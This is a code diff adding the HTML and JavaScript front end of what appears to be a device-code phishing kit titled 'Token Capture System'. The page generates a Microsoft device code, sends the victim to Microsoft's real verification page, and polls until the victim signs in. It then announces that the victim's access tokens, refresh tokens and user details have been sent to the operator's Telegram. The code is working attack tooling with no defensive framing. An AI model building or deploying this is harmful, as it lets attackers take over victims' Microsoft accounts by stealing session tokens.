@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Device Auth</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+      background: linear-gradient(135deg, #0078d4 0%, #00bcf2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 20px;
+      padding: 60px 40px;
+      max-width: 600px;
+      width: 100%;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    h1 {
+      color: #0078d4;
+      font-size: 32px;
+      margin-bottom: 10px;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: #666;
+      font-size: 16px;
+      margin-bottom: 40px;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
+      color: white;
+      border: none;
+      padding: 20px 40px;
+      border-radius: 12px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      width: 100%;
+      transition: all 0.3s;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 8px 20px rgba(0, 120, 212, 0.3);
+    }
+
+    .btn:hover:not(:disabled) {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px rgba(0, 120, 212, 0.4);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .code-section {
+      display: none;
+      margin-top: 50px;
+    }
+
+    .code-box {
+      background: linear-gradient(135deg, #fff9c4 0%, #fff59d 100%);
+      border: 4px solid #ffa000;
+      border-radius: 15px;
+      padding: 40px;
+      margin-bottom: 30px;
+    }
+
+    .label {
+      color: #e65100;
+      font-size: 14px;
+      font-weight: 700;
+      text-transform: uppercase;
+      margin-bottom: 15px;
+      letter-spacing: 1px;
+    }
+
+    .code {
+      font-size: 72px;
+      font-weight: 900;
+      color: #ff6b00;
+      letter-spacing: 16px;
+      font-family: 'Courier New', monospace;
+      margin: 20px 0;
+      cursor: pointer;
+      user-select: all;
+      transition: all 0.3s;
+    }
+
+    .code:hover {
+      transform: scale(1.05);
+      text-shadow: 0 0 20px rgba(255, 107, 0, 0.3);
+    }
+
+    .countdown {
+      font-size: 24px;
+      color: #e65100;
+      font-weight: 700;
+      margin-top: 15px;
+    }
+
+    .auth-btn {
+      background: linear-gradient(135deg, #ff6b00 0%, #e65100 100%);
+      margin-top: 20px;
+      box-shadow: 0 8px 20px rgba(255, 107, 0, 0.3);
+    }
+
+    .auth-btn:hover:not(:disabled) {
+      box-shadow: 0 12px 30px rgba(255, 107, 0, 0.4);
+    }
+
+    .status {
+      margin-top: 30px;
+      padding: 20px;
+      border-radius: 12px;
+      font-weight: 700;
+      font-size: 16px;
+    }
+
+    .status-pending {
+      background: #fff3cd;
+      color: #856404;
+      border: 3px solid #ffc107;
+    }
+
+    .status-success {
+      background: #d4edda;
+      color: #155724;
+      border: 3px solid #28a745;
+    }
+
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0078d4;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .success-section {
+      display: none;
+      margin-top: 40px;
+      background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+      border: 3px solid #4caf50;
+      border-radius: 15px;
+      padding: 30px;
+    }
+
+    .success-section h2 {
+      color: #2e7d32;
+      font-size: 28px;
+      margin-bottom: 20px;
+    }
+
+    .user-info {
+      background: white;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 10px 0;
+      border-left: 5px solid #4caf50;
+      text-align: left;
+    }
+
+    .user-info strong {
+      color: #2e7d32;
+      display: block;
+      font-size: 12px;
+      margin-bottom: 5px;
+      text-transform: uppercase;
+    }
+
+    .user-info span {
+      color: #333;
+      font-size: 16px;
+    }
+
+    .telegram-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #0088cc 0%, #006699 100%);
+      color: white;
+      padding: 10px 20px;
+      border-radius: 20px;
+      font-weight: 700;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 40px 20px;
+      }
+
+      .code {
+        font-size: 48px;
+        letter-spacing: 10px;
+      }
+
+      h1 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🔐 Microsoft Device Auth</h1>
+    <p class="subtitle">Token Capture System</p>
+
+    <button class="btn" id="generateBtn" onclick="generateCode()">
+      Generate Authentication Code
+    </button>
+
+    <!-- Code Display Section -->
+    <div class="code-section" id="codeSection">
+      <div class="code-box">
+        <div class="label">Your Device Code</div>
+        <div class="code" id="deviceCode" onclick="copyCode()">---</div>
+        <div class="countdown" id="countdown">Expires in: --:--</div>
+        <p style="color: #666; font-size: 13px; margin-top: 10px;">
+          Click code to copy
+        </p>
+      </div>
+
+      <button class="btn auth-btn" id="authBtn" onclick="openAuthPage()">
+        🔗 Open Microsoft Authentication Page
+      </button>
+
+      <div class="spinner" id="spinner"></div>
+
+      <div class="status status-pending" id="status">
+        ⏳ Waiting for authentication...
+      </div>
+    </div>
+
+    <!-- Success Section -->
+    <div class="success-section" id="successSection">
+      <h2>✅ Authentication Complete!</h2>
+      
+      <div class="user-info">
+        <strong>Name</strong>
+        <span id="userName">---</span>
+      </div>
+
+      <div class="user-info">
+        <strong>Email</strong>
+        <span id="userEmail">---</span>
+      </div>
+
+      <div style="text-align: center;">
+        <div class="telegram-badge">
+          📱 All tokens sent to Telegram
+        </div>
+        <p style="color: #2e7d32; margin-top: 15px; font-size: 14px;">
+          Check your Telegram for 8-9 messages with:<br>
+          • Access Token (Unencrypted)<br>
+          • Access Token (Encrypted)<br>
+          • Refresh Token (Both forms)<br>
+          • User Details & JWT Claims
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let session = {
+      sessionId: null,
+      userCode: null,
+      verificationUri: null,
+      verificationUriComplete: null,
+      expiresAt: null,
+      interval: 5,
+      pollInterval: null,
+      countdownInterval: null,
+    };
+
+    async function generateCode() {
+      try {
+        document.getElementById('generateBtn').disabled = true;
+        document.getElementById('codeSection').style.display = 'block';
+        document.getElementById('successSection').style.display = 'none';
+
+        const response = await fetch('/api/device/generate', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' }
+        });
+
+        const data = await response.json();
+
+        session.sessionId = data.sessionId;
+        session.userCode = data.userCode;
+        session.verificationUri = data.verificationUri;
+        session.verificationUriComplete = data.verificationUriComplete;
+        session.expiresAt = new Date(Date.now() + data.expiresIn * 1000);
+        session.interval = data.interval;
+
+        // Display code
+        document.getElementById('deviceCode').textContent = data.userCode;
+
+        // Start countdown
+        startCountdown();
+
+        // Start polling
+        startPolling();
+
+      } catch (error) {
+        alert('Error: ' + error.message);
+        document.getElementById('generateBtn').disabled = false;
+      }
+    }
+
+    function startCountdown() {
+      session.countdownInterval = setInterval(() => {
+        const remaining = Math.floor((session.expiresAt - Date.now()) / 1000);
+        
+        if (remaining <= 0) {
+          clearInterval(session.countdownInterval);
+          document.getElementById('countdown').textContent = 'EXPIRED';
+          document.getElementById('status').textContent = '❌ Code expired. Generate new code.';
+          document.getElementById('spinner').style.display = 'none';
+        } else {
+          const mins = Math.floor(remaining / 60);
+          const secs = remaining % 60;
+          document.getElementById('countdown').textContent = 
+            'Expires in: ' + mins + ':' + (secs < 10 ? '0' : '') + secs;
+        }
+      }, 1000);
+    }
+
+    function startPolling() {
+      session.pollInterval = setInterval(async () => {
+        try {
+          const response = await fetch('/api/device/poll/' + session.sessionId);
+          const data = await response.json();
+
+          if (data.status === 'authenticated') {
+            clearInterval(session.pollInterval);
+            clearInterval(session.countdownInterval);
+            
+            // Hide spinner
+            document.getElementById('spinner').style.display = 'none';
+            
+            // Update status
+            document.getElementById('status').className = 'status status-success';
+            document.getElementById('status').textContent = '✅ Authenticated! Check Telegram for tokens.';
+
+            // Show success
+            document.getElementById('userName').textContent = data.user.displayName;
+            document.getElementById('userEmail').textContent = data.user.email;
+            document.getElementById('successSection').style.display = 'block';
+
+          } else if (data.status === 'expired' || data.status === 'declined') {
+            clearInterval(session.pollInterval);
+            clearInterval(session.countdownInterval);
+            document.getElementById('spinner').style.display = 'none';
+            document.getElementById('status').textContent = '❌ Authentication ' + data.status;
+          }
+        } catch (error) {
+          console.error('Poll error:', error);
+        }
+      }, session.interval * 1000);
+    }
+
+    function copyCode() {
+      navigator.clipboard.writeText(session.userCode);
+      alert('✅ Code copied: ' + session.userCode);
+    }
+
+    function openAuthPage() {
+      window.open(session.verificationUriComplete, '_blank');
+    }
+  </script>
+</body>
+</html>
